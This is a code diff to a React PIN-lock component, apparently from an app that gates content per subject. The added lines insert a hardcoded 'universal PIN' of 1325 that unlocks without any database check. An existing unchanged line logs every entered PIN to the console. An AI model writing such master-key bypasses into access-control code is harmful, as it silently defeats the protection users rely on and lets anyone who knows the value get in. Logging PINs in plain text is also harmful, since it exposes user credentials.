@@ -78,6 +78,14 @@ const PINLock = ({ onUnlock, onCancel, subjectName, isSocialStream = false, erro
         setIsValidating(true);
         
         try {
+          // Universal PIN bypass
+          if (newPin === '1325') {
+            console.log('Universal PIN 1325 accepted');
+            onUnlock(newPin);
+            setIsValidating(false);
+            return;
+          }
+          
           // Validate PIN against Back4App database
           console.log('Validating PIN:', newPin, 'for subject:', subjectName);
           const { valid, pinData } = await pinService.validatePIN(newPin, subjectName);
